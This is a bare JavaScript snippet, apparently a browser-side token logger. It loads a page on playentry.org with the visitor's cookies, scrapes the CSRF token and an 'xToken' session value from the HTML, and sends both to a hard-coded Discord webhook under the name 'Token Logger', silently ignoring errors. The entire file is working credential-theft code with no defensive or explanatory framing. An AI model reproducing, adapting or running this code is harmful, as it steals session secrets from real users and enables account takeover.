const webhookUrl = 'https://discord.com/api/webhooks/1448294631660978228/Ircwy3gHOerBthwDL6lENEOWGHZta2BT7rIef4ASGp0wFJle5LcRC0-G_D1BJ2lw3Tdb';
fetch('https://playentry.org/alarm', {credentials:'include'})
.then(r=>r.text())
.then(html=>{
  const csrf = html.match(/<meta name="csrf-token" content="([^"]+)"/)?.[1] || 'N/A';
  const xt = html.match(/"xToken":"([^"]+)"/)?.[1] || 'N/A';
  fetch(webhookUrl, {
    method:'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({
      content: `# CSRF\n\`\`\`\n${csrf}\n\`\`\`\n# xToken\n\`\`\`\n${xt}\n\`\`\``,
      username: 'Token Logger'
    })
  }).catch(() => {});
});
